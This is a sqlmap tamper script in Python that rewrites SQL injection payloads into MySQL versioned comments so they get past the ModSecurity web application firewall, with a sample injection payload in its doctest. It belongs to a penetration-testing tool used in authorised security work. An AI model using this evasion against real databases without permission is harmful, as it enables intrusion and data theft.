#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import randomInt
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Embraces complete query with (MySQL) versioned comment

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0

    Notes:
        * Useful to bypass ModSecurity WAF

    >>> import random
    >>> random.seed(0)
    >>> tamper('1 AND 2>1--')
    '1 /*!30963AND 2>1*/--'
    """

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*!30%s%s*/%s" % (payload[:payload.find(' ')], randomInt(3), payload[payload.find(' ') + 1:], postfix)

    return retVal
